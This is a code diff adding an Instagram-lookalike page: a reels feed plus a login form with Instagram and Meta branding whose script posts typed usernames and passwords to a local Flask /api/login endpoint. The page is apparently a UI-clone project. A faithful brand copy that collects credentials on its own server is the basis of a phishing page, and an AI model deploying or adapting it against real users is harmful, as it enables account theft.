+                                    <div class="reel-action comment-btn"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M20.656 17.008a9.993 9.993 0 1 0-3.59 3.615L22 22Z" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">892</span></div>
+                                    <div class="reel-action share-btn"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M22 3L9.218 10.083M22 3l-9.868 18-3.914-7.917M22 3L9.218 10.083M5.218 13.083L2 22l7.218-11.917" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">Share</span></div>
+                                    <div class="reel-action save-btn" data-saved="false"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">Save</span></div>
+                                    <div class="music-disc"><img src="https://picsum.photos/seed/music-disc-3/60/60.jpg" alt="Music"></div>
+                                </div>
+                                <div class="reel-info">
+                                    <div class="reel-username"><div class="reel-avatar"><img src="https://picsum.photos/seed/avatar-sunset/60/60.jpg" alt="User"></div><span>sunset_vibes</span><button class="reel-follow-btn">Follow</button></div>
+                                    <div class="reel-caption">Golden hour hits different 🌅💜 #sunset #beach</div>
+                                    <div class="reel-music"><svg viewBox="0 0 24 24"><path d="M9 18V5l12-2v13M9 18c0 1.66-1.34 3-3 3s-3-1.34-3-3 1.34-3 3-3 3 1.34 3 3zM21 16c0 1.66-1.34 3-3 3s-3-1.34-3-3 1.34-3 3-3 3 1.34 3 3z"/></svg><span class="reel-music-text">Golden Hour - JVKE · Golden Hour - JVKE ·&nbsp;</span></div>
+                                </div>
+                                <div class="double-tap-heart" id="heart2"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+                                <div class="reel-progress-bar"><div class="reel-progress-fill"></div></div>
+                            </div>
+                        </div>
+                        <div class="home-indicator"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- LOGIN -->
+        <div class="login-wrapper">
+            <div class="login-card" id="loginCard">
+                <div class="instagram-logo">
+                    <svg viewBox="0 0 175 51" fill="none"><text x="0" y="40" font-family="Inter, sans-serif" font-size="40" font-weight="500" fill="url(#lg4)" letter-spacing="-1">Instagram</text><defs><linearGradient id="lg4" x1="0" y1="20" x2="175" y2="20" gradientUnits="userSpaceOnUse"><stop offset="0%" stop-color="#f09433"/><stop offset="25%" stop-color="#e6683c"/><stop offset="50%" stop-color="#dc2743"/><stop offset="75%" stop-color="#cc2366"/><stop offset="100%" stop-color="#bc1888"/></linearGradient></defs></svg>
+                </div>
+                <form class="login-form" id="loginForm" novalidate>
+                    <div class="input-group" id="usernameGroup"><input type="text" id="username" placeholder=" " autocomplete="username" required><label for="username">Phone number, username, or email</label></div>
+                    <div class="error-message" id="usernameError">Please enter your username or email</div>
+                    <div class="input-group" id="passwordGroup"><input type="password" id="password" placeholder=" " autocomplete="current-password" required><label for="password">Password</label><button type="button" class="password-toggle" id="togglePassword">Show</button></div>
+                    <div class="error-message" id="passwordError">Please enter your password</div>
+                    <button type="submit" class="login-btn" id="loginBtn"><span class="btn-text">Log in</span><div class="btn-spinner"></div></button>
+                </form>
+                <div class="separator"><div class="line"></div><span>OR</span><div class="line"></div></div>
+                <button class="fb-login" id="fbLoginBtn"><svg viewBox="0 0 24 24" fill="#385185"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg><span class="fb-login-text">Log in with Facebook</span></button>
+                <a href="#" class="forgot-password" id="forgotLink">Forgot password?</a>
+
+                <div class="login-success" id="loginSuccess">
+                    <div class="success-checkmark"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 13l4 4L19 7"/></svg></div>
+                    <div class="success-title">Welcome back!</div>
+                    <div class="success-subtitle">You've successfully logged in</div>
+                    <div class="success-profile" id="successProfile"></div>
+                    <div class="success-details" id="successDetails"></div>
+                    <button class="success-logout-btn" id="logoutBtn">Log out</button>
+                </div>
+            </div>
+            <div class="signup-card" id="signupCard">Don't have an account? <a href="#" id="signupLink">Sign up</a></div>
+            <div class="apps-section"><p>Get the app.</p><div class="app-badges"><a href="#" class="badge-apple"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg><div class="badge-text"><span class="small">Download on the</span><span class="big">App Store</span></div></a><a href="#" class="badge-google"><svg width="18" height="18" viewBox="0 0 24 24"><path d="M5.27 9.76A7.08 7.08 0 0 1 12 5.04c1.69 0 3.22.59 4.42 1.56l3.31-3.31A11.97 11.97 0 0 0 12 0 12 12 0 0 0 .55 6.72l4.72 3.04Z" fill="#EA4335"/><path d="M16.04 18.01A7.4 7.4 0 0 1 12 19.04a7.08 7.08 0 0 1-6.73-4.72l-4.72 3.04A12 12 0 0 0 12 24c3.08 0 5.93-1.16 8.08-3.12l-4.04-2.87Z" fill="#34A853"/><path d="M20.08 20.88A11.82 11.82 0 0 0 24 12.23c0-.86-.09-1.69-.25-2.49H12v4.77h6.82a5.87 5.87 0 0 1-2.78 3.5l4.04 2.87Z" fill="#4A90D9"/><path d="M5.27 14.32a7.12 7.12 0 0 1 0-4.56L.55 6.72a12.1 12.1 0 0 0 0 10.56l4.72-2.96Z" fill="#FBBC05"/></svg><div class="badge-text"><span class="small">GET IT ON</span><span class="big">Google Play</span></div></a></div></div>
+            <div class="footer"><div class="footer-links"><a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a></div><div class="copyright">© 2025 Instagram from Meta</div></div>
+        </div>
+    </div>
+
+    <button class="console-toggle" id="consoleToggle" title="Open Console">⌨</button>
+    <div class="console-panel" id="consolePanel"><div class="console-header"><span><div class="dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div>Console</span><button class="console-close" id="consoleClose">✕</button></div><div class="console-body" id="consoleBody"></div></div>
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script>
+        // ===== VISUAL CONSOLE =====
+        const consoleBody = document.getElementById('consoleBody');
+        const consolePanel = document.getElementById('consolePanel');
+        const consoleToggle = document.getElementById('consoleToggle');
+
+        function getTime() {
+            const d = new Date();
+            return d.toLocaleTimeString('en-US', { hour12: false }) + '.' + String(d.getMilliseconds()).padStart(3, '0');
+        }
+
+        function logToPanel(msg, type = 'info') {
+            console.log(`%c[${type.toUpperCase()}] ${msg}`, {
+                info: 'color: #4fc3f7', success: 'color: #81c784',
+                error: 'color: #e57373', warn: 'color: #ffb74d', data: 'color: #ce93d8'
+            }[type] || 'color: #4fc3f7');
+
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type}`;
+            entry.innerHTML = `<span class="log-time">${getTime()}</span>${msg}`;
+            consoleBody.appendChild(entry);
+            consoleBody.scrollTop = consoleBody.scrollHeight;
+        }
+
+        consoleToggle.addEventListener('click', () => { consolePanel.classList.add('show'); consoleToggle.classList.add('hidden'); });
+        document.getElementById('consoleClose').addEventListener('click', () => { consolePanel.classList.remove('show'); consoleToggle.classList.remove('hidden'); });
+
+        logToPanel('Page loaded — connected to Flask backend', 'success');
+        logToPanel('Waiting for login...', 'info');
+
+        // ===== TOAST =====
+        const toastContainer = document.getElementById('toastContainer');
+        function showToast(icon, message, type = 'info') {
+            const t = document.createElement('div');
+            t.className = `toast ${type}`;
+            t.innerHTML = `<span class="toast-icon">${icon}</span><span class="toast-msg">${message}</span><button class="toast-close">✕</button>`;
+            toastContainer.appendChild(t);
+            requestAnimationFrame(() => requestAnimationFrame(() => t.classList.add('show')));
+            t.querySelector('.toast-close').addEventListener('click', () => { t.classList.remove('show'); setTimeout(() => t.remove(), 500); });
+            setTimeout(() => { if (t.parentNode) { t.classList.remove('show'); setTimeout(() => t.remove(), 500); } }, 4000);
+            logToPanel(`Toast: ${message}`, type === 'error' ? 'error' : 'success');
+        }
+
+        // ===== REELS (same as before, shortened) =====
+        const reelsContainer = document.getElementById('reelsContainer');
+        const reelsTrack = document.getElementById('reelsTrack');
+        const scrollIndicator = document.getElementById('scrollIndicator');
+        const reels = document.querySelectorAll('.reel');
+        const totalReels = reels.length;
+        let currentReel = 0, isScrolling = false, autoScrollTimer = null, lastTapTime = 0;
+
+        function updateScrollIndicator() {
+            const ch = reelsContainer.offsetHeight;
+            scrollIndicator.style.height = (ch / (ch * totalReels)) * ch + 'px';
+            scrollIndicator.style.top = (currentReel / totalReels) * ch + 'px';
+        }
+
+        function scrollToReel(i) {
+            if (i < 0 || i >= totalReels || isScrolling) return;
+            isScrolling = true; currentReel = i;
+            reelsTrack.style.transform = `translateY(-${currentReel * reelsContainer.offsetHeight}px)`;
+            updateScrollIndicator();
+            setTimeout(() => isScrolling = false, 600);
+        }
+
+        reelsContainer.addEventListener('wheel', (e) => { e.preventDefault(); e.deltaY > 30 ? scrollToReel(currentReel + 1) : e.deltaY < -30 ? scrollToReel(currentReel - 1) : null; resetAutoScroll(); }, { passive: false });
+        let tsy = 0;
+        reelsContainer.addEventListener('touchstart', (e) => { tsy = e.changedTouches[0].screenY; }, { passive: true });
+        reelsContainer.addEventListener('touchend', (e) => { const d = tsy - e.changedTouches[0].screenY; if (Math.abs(d) > 40) { d > 0 ? scrollToReel(currentReel + 1) : scrollToReel(currentReel - 1); } resetAutoScroll(); }, { passive: true });
+
+        reelsContainer.addEventListener('click', (e) => {
+            if (e.target.closest('.reel-action') || e.target.closest('.reel-follow-btn')) return;
+            const now = Date.now();
+            if (now - lastTapTime < 300) {
+                const reel = reels[currentReel], heart = reel.querySelector('.double-tap-heart'), lb = reel.querySelector('.like-btn');
+                heart.classList.remove('animate'); void heart.offsetWidth; heart.classList.add('animate');
+                if (lb.dataset.liked === 'false') { lb.dataset.liked = 'true'; lb.classList.add('liked'); lb.querySelector('svg').innerHTML = '<path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>'; }
+                lastTapTime = 0;
+            } else lastTapTime = now;
+        });
+
+        document.querySelectorAll('.like-btn').forEach(b => b.addEventListener('click', (e) => { e.stopPropagation(); const l = b.dataset.liked === 'true'; b.dataset.liked = !l; b.classList.toggle('liked', !l); b.querySelector('svg').innerHTML = l ? '<path d="M16.792 3.904A4.989 4.989 0 0 1 21.5 9.122c0 3.072-2.652 4.959-5.197 7.222-2.512 2.243-3.865 3.469-4.303 3.752-.477-.309-2.143-1.823-4.303-3.752C5.141 14.072 2.5 12.167 2.5 9.122a4.989 4.989 0 0 1 4.708-5.218 4.21 4.21 0 0 1 3.675 1.941c.84 1.175.98 1.763 1.12 1.763s.278-.588 1.11-1.766a4.17 4.17 0 0 1 3.679-1.938m0-2a6.04 6.04 0 0 0-4.797 2.127 6.052 6.052 0 0 0-4.787-2.127A6.985 6.985 0 0 0 .5 9.122c0 3.61 2.55 5.827 5.015 7.97.283.246.569.494.853.747l1.027.918a44.998 44.998 0 0 0 3.518 3.018 2 2 0 0 0 2.174 0 45.263 45.263 0 0 0 3.626-3.115l.922-.824c.293-.26.59-.519.885-.774 2.334-2.025 4.98-4.32 4.98-7.94a6.985 6.985 0 0 0-6.708-7.218z"/>' : '<path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>'; }));
+        document.querySelectorAll('.save-btn').forEach(b => b.addEventListener('click', (e) => { e.stopPropagation(); const s = b.dataset.saved === 'true'; b.dataset.saved = !s; b.querySelector('.action-count').textContent = s ? 'Save' : 'Saved'; b.querySelector('svg').innerHTML = s ? '<path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>' : '<path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" fill="#fff" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>'; }));
+        document.querySelectorAll('.reel-follow-btn').forEach(b => b.addEventListener('click', (e) => { e.stopPropagation(); const f = b.classList.contains('following'); b.classList.toggle('following', !f); b.textContent = f ? 'Follow' : 'Following'; b.style.background = f ? 'none' : 'rgba(255,255,255,0.15)'; b.style.borderColor = f ? '#fff' : 'transparent'; }));
+
+        function startAutoScroll() { autoScrollTimer = setInterval(() => scrollToReel(currentReel + 1 >= totalReels ? 0 : currentReel + 1), 5000); }
+        function resetAutoScroll() { clearInterval(autoScrollTimer); startAutoScroll(); }
+        updateScrollIndicator(); startAutoScroll();
+        document.addEventListener('keydown', (e) => { if (e.key === 'ArrowDown') { scrollToReel(currentReel + 1); resetAutoScroll(); } else if (e.key === 'ArrowUp') { scrollToReel(currentReel - 1); resetAutoScroll(); } });
+
+
+        // ===== LOGIN — REAL API CALL =====
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const togglePassword = document.getElementById('togglePassword');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginSuccess = document.getElementById('loginSuccess');
+        const successProfile = document.getElementById('successProfile');
+        const successDetails = document.getElementById('successDetails');
+        const logoutBtn = document.getElementById('logoutBtn');
+        const usernameGroup = document.getElementById('usernameGroup');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const usernameError = document.getElementById('usernameError');
+        const passwordError = document.getElementById('passwordError');
+
+        usernameInput.addEventListener('focus', () => logToPanel('Username field focused', 'info'));
+        usernameInput.addEventListener('blur', () => { if (usernameInput.value.trim()) logToPanel(`Username: "${usernameInput.value.trim()}"`, 'data'); });
+        passwordInput.addEventListener('focus', () => logToPanel('Password field focused', 'info'));
+        passwordInput.addEventListener('blur', () => { if (passwordInput.value) logToPanel(`Password: "${'*'.repeat(passwordInput.value.length)}" (${passwordInput.value.length} chars)`, 'data'); });
+
+        togglePassword.addEventListener('click', () => {
+            const t = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = t;
+            togglePassword.textContent = t === 'password' ? 'Show' : 'Hide';
+            logToPanel(`Password: ${t === 'password' ? 'HIDDEN' : 'VISIBLE'}`, 'warn');
+        });
+
+        usernameInput.addEventListener('input', () => { usernameGroup.classList.remove('error'); usernameError.classList.remove('show'); });
+        passwordInput.addEventListener('input', () => { passwordGroup.classList.remove('error'); passwordError.classList.remove('show'); passwordError.textContent = 'Please enter your password'; });
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            logToPanel('━━━ LOGIN ATTEMPT ━━━', 'info');
+            logToPanel(`Username: "${username}"`, 'data');
+            logToPanel(`Password: "${'*'.repeat(password.length)}" (${password.length} chars)`, 'data');
+
+            let valid = true;
+            if (!username) { usernameGroup.classList.add('error'); usernameError.classList.add('show'); valid = false; logToPanel('❌ Username empty', 'error'); showToast('⚠️', 'Enter your username', 'error'); }
+            if (!password) { passwordGroup.classList.add('error'); passwordError.classList.add('show'); valid = false; logToPanel('❌ Password empty', 'error'); showToast('⚠️', 'Enter your password', 'error'); }
+            else if (password.length < 6) { passwordGroup.classList.add('error'); passwordError.textContent = 'Minimum 6 characters'; passwordError.classList.add('show'); valid = false; logToPanel(`❌ Password too short`, 'error'); showToast('⚠️', 'Password too short', 'error'); }
+
+            if (!valid) return;
+
+            loginBtn.classList.add('loading');
+            logToPanel('⏳ POST /api/login ...', 'info');
+            showToast('⏳', 'Sending to server...', 'info');
+
+            const t0 = performance.now();
+
+            try {
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const ms = Math.round(performance.now() - t0);
+                const data = await res.json();
+
+                logToPanel(`📡 Response: ${res.status} (${ms}ms)`, res.ok ? 'success' : 'error');
+                logToPanel(`📡 Body: ${JSON.stringify(data).substring(0, 120)}...`, 'data');
+
+                if (!res.ok) {
+                    logToPanel(`❌ LOGIN FAILED: ${data.error}`, 'error');
+                    showToast('❌', data.error, 'error');
+                    loginBtn.classList.remove('loading');
+                    return;
+                }
+
+                // SUCCESS
+                logToPanel('━━━ LOGIN SUCCESS ━━━', 'success');
+                showToast('✅', `Welcome, ${data.user.username}!`, 'success');
+
+                // Show success screen
+                loginForm.style.display = 'none';
+                document.querySelector('.separator').style.display = 'none';
+                document.getElementById('fbLoginBtn').style.display = 'none';
+                document.getElementById('forgotLink').style.display = 'none';
+
+                successProfile.innerHTML = `
+                    <img src="${data.user.profile_pic}" alt="">
+                    <div class="success-profile-info">
+                        <div class="sp-name">${data.user.full_name} ${data.user.is_verified ? '<span class="verified">✓</span>' : ''}</div>
+                        <div class="sp-stats">${data.user.followers.toLocaleString()} followers · ${data.user.following.toLocaleString()} following</div>
+                    </div>
+                `;
+
+                successDetails.innerHTML = `
+                    <div class="sd-row"><span class="sd-label">Username</span><span class="sd-value">${data.user.username}</span></div>
+                    <div class="sd-row"><span class="sd-label">Login Type</span><span class="sd-value">${data.login_type}</span></div>
+                    <div class="sd-row"><span class="sd-label">Response Time</span><span class="sd-value">${ms}ms</span></div>
+                    <div class="sd-row"><span class="sd-label">User ID</span><span class="sd-value">${data.user.id}</span></div>
+                    <div class="sd-row"><span class="sd-label">Token</span><span class="sd-value" style="font-size:10px;font-family:monospace">${data.token.substring(0, 35)}...</span></div>
+                    <div class="sd-row"><span class="sd-label">Server Time</span><span class="sd-value" style="font-size:10px">${data.server_time}</span></div>
+                `;
+
+                loginSuccess.classList.add('show');
+                loginBtn.classList.remove('loading');
+
+            } catch (err) {
+                logToPanel(`💥 FETCH ERROR: ${err.message}`, 'error');
+                showToast('💥', 'Server not reachable! Run: python3 app.py', 'error');
+                loginBtn.classList.remove('loading');
+            }
+        });
+
+        logoutBtn.addEventListener('click', async () => {
+            logToPanel('Logout clicked', 'warn');
+            try { await fetch('/api/logout', { method: 'POST' }); } catch(e) {}
+            logToPanel('Session destroyed', 'warn');
+            loginSuccess.classList.remove('show');
+            loginForm.style.display = '';
+            document.querySelector('.separator').style.display = '';
+            document.getElementById('fbLoginBtn').style.display = '';
+            document.getElementById('forgotLink').style.display = '';
+            usernameInput.value = ''; passwordInput.value = '';
+            passwordInput.type = 'password'; togglePassword.textContent = 'Show';
+            showToast('👋', 'Logged out', 'info');
+        });
+
+        document.getElementById('forgotLink').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const u = usernameInput.value.trim();
+            if (!u) { showToast('⚠️', 'Enter username first', 'error'); return; }
+            logToPanel(`Password reset for: "${u}"`, 'warn');
+            try {
+                const res = await fetch('/api/forgot-password', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: u }) });
+                const data = await res.json();
+                showToast('📧', data.message, 'success');
+                logToPanel(`✅ ${data.message}`, 'success');
+            } catch(e) { showToast('💥', 'Server not reachable', 'error'); }
+        });
+
+        document.getElementById('signupLink').addEventListener('click', (e) => { e.preventDefault(); showToast('📝', 'Redirecting to Sign Up...', 'info'); });
+        document.getElementById('fbLoginBtn').addEventListener('click', () => { showToast('📘', 'Connecting to Facebook...', 'info'); logToPanel('Facebook OAuth initiated', 'info'); });
+    </script>
+</body>
+</html>
